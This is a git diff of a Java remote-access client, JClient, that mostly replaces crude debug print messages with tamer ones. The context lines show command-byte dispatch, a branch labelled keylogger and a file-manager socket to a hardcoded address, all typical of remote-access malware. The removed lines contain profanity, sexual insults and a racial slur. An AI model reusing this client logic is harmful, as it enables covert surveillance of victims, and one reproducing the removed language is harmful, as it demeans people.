@@ -41,7 +41,6 @@ public class JClient{
 							System.out.println("fUCK YOU!");
 							run();
 						} else {
-//							System.out.println("I DON'T KNOW WHAT THE FUCK IS GOING ON. QUITTING!");
 							System.out.println(t.getName() + "; " + e);
 							e.printStackTrace();
 						}
@@ -107,10 +106,10 @@ public class JClient{
 //					File database = new File("GeoLite2-City.mmdb"); //GET THE OFFICIAL SOMEHOW!
 
 //					DatabaseReader reader = new DatabaseReader.Builder(database).build();
-//					System.out.println("pussy JUICE!");
+//					System.out.println("ORANGE JUICE!");
 //
 //					CityResponse response = reader.city(InetAddress.getByName(IPChecker.getIP()));
-//					System.out.println("SUCK MY COCK!");
+//					System.out.println("BLUE DINOSAUR!");
 					
 //					temp.println("USA");
 					//country
@@ -119,7 +118,7 @@ public class JClient{
 
 //					System.out.println("COUNTRY CODE: " + response.getCountry().getIsoCode());
 					
-					System.out.println("LICK THE PENIS!");
+					System.out.println("STOP MOVING!!");
 
 
 //					temp.println("New York City");
@@ -178,10 +177,10 @@ public class JClient{
 //				Thread thread1 = new Thread(new ClientConnectionChecker(mainSocket));
 //				thread1.start();
 //				while(true) {
-////					System.out.println("cock sucker");
+////					System.out.println("ZOMBIE STOPPER");
 //				}
 //			} catch (ArithmeticException e) {
-//				System.out.println("I'M NOT READY MY DICK IS STUCK!");
+//				System.out.println("I'M NOT READY!!");
 //				System.exit(0);
 //			}
 //		    ClientConnectionChecker checker = new ClientConnectionChecker(mainSocket);
@@ -201,18 +200,18 @@ public class JClient{
 
 //			    threadExecutor.submit(checker).get(); //starts checker in a new thread
 			    
-			    System.out.println("FUCK YOU");
+			    System.out.println("STOP ROLLING");
 //			    System.exit(0);
 				InputStream in = commandSocket.getInputStream();
 				
-				System.out.println("I SUCK YOUR MOM");
+				System.out.println("WALLET WALLET WLLET");
 				while(true) {
-//					System.out.println("NBA SUCK MY NUTS");
+//					System.out.println("BORED TO DEATH");
 					byte[] temp = new byte[1];
 					//reads whatever command and determines what to do.
 //					System.out.println("LOVE YOU SO!");
 					in.read(temp, 0, 1);
-//					System.out.println("suc my DAD1 YOU SOUL WHAT'S READ: " + temp[0]);
+//					System.out.println(YOU SOUL WHAT'S READ: " + temp[0]);
 //						System.out.println("Command is: " + command);
 					if(temp[0] == (byte)5) { //KEYLOGGER :o
 						System.out.println("FUCK MAN I'M IN HERE!");
@@ -279,7 +278,7 @@ public class JClient{
 									Socket fileManagerDataSocket = new Socket("192.168.1.66", 7575);
 									writeStringOutStream(fileManagerDataSocket.getOutputStream(), "fileManagerData");
 									new ClientFileManager(fileManagerCommandSocket, fileManagerDataSocket);
-									System.out.println("MY PENIS I BIG !");
+									System.out.println("FIVE GUYS !");
 									break outerloop;
 								} catch(Exception e) {
 									
@@ -291,7 +290,7 @@ public class JClient{
 						}
 					}
 					if(temp[0] == (byte)2) {
-						System.out.println("WHAT THE FUCK?");
+						System.out.println("WHAT'S GOING ON?");
 						//A DataOutputStream can write ints, longs and other primitive data types.
 						//A BufferedOutputStream can just buffer a bunch of bytes. One stream can do
 						//things the other can't and vice versa. Wrapping them (in the correct order) offers
@@ -299,7 +298,7 @@ public class JClient{
 						//types to a buffered stream.
 						outerloop:
 						while(true) {
-////							System.out.println("dicksucker");
+////							System.out.println("STOPPAGE TIME");
 //							byte[] bytes;
 ////							System.out.println("Available: " + in.available());
 //							if(in.available() > 0) { //so if something was sent. quit.
@@ -386,9 +385,9 @@ public class JClient{
 //							love.start();
 						}
 					}
-//					System.out.println("CUNT?");
+//					System.out.println("STOPPP??????");
 
-//					System.out.println("in here forever nigga!");
+//					System.out.println("in here forever BRO!!!");
 				}
 				
 			} 
@@ -397,12 +396,12 @@ public class JClient{
 //					System.out.println("Connection lost. Looking for server!");
 ////					System.exit(0);
 //				}
-//				//suck a dick
+//				//QUIT THAT!
 //			}catch(InterruptedException e) {
 //				//idk what to do
 //			} 
 			catch(UnknownHostException e) {
-				//idk what the fuk to do here
+				//idk what U DOING HERE FOR to do here
 			} catch(IOException e) {
 				System.out.println("Waiting for server to come online!");
 //				socket.close();
